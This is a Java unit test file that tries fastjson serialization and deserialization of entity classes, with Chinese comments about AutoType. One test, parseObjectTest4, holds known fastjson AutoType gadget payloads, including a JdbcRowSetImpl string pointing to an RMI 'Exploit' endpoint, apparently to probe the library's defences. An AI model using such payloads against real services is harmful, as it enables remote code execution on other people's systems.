package com.xkcoding.orm.mybatis.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.TypeReference;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.xkcoding.orm.mybatis.entity.DataEntity;
import com.xkcoding.orm.mybatis.entity.DataResultEntity;
import org.junit.Test;

import java.util.List;
import java.util.Map;

import static com.xkcoding.orm.mybatis.utils.getDataList;
import static com.xkcoding.orm.mybatis.utils.getDataResultList;

public class fastJsonTest {

    @Test
    public void parseObjectTest1() {
        List<DataEntity> dataList = getDataList(10);
        String json = JSON.toJSONString(dataList);
        List<DataEntity> dataEntity = JSON.parseObject(json, new TypeReference<List<DataEntity>>() {});
        System.out.println(dataEntity.toString());
    }

    @Test
    public void parseObjectTest2() {
        List<DataResultEntity> dataResultList = getDataResultList(10);
        String json = JSON.toJSONString(dataResultList.get(0));
        DataResultEntity dataEntity = JSON.parseObject(json, new TypeReference<DataResultEntity>() {});
        System.out.println(dataEntity.toString());
    }

    @Test
    public void parseObjectTest3() {
        List<DataResultEntity> dataResultList = getDataResultList(10);
        // 老版本反序列化DataResultEntity必须使用Autotype，就是加上SerializerFeature.WriteClassName，之后序列化的json就会加上@Type
        String json = JSON.toJSONString(dataResultList.get(0));
//        String json = JSON.toJSONString(dataResultList.get(0));
        // 老版本不使用AutoType就会解析不出DataResultEntity中的DataEntityParent
        DataResultEntity dataEntity = JSON.parseObject(json, DataResultEntity.class);
        System.out.println(dataEntity.toString());
    }


    @Test
    public void parseObjectTest4() {
//        String json = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"}";
        String json = "{\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"}";
        JSON.parseObject(json, new TypeReference<DataResultEntity>(){});
    }

    /**
     * 实体类转Map
     */
    @Test
    public void entity2MapTest() {
        DataResultEntity dataResultEntity = getDataResultList(1).get(0);
        String o = JSON.toJSONString(dataResultEntity);
        Map map = JSON.parseObject(o, Map.class);
        System.out.println(map);
    }

}
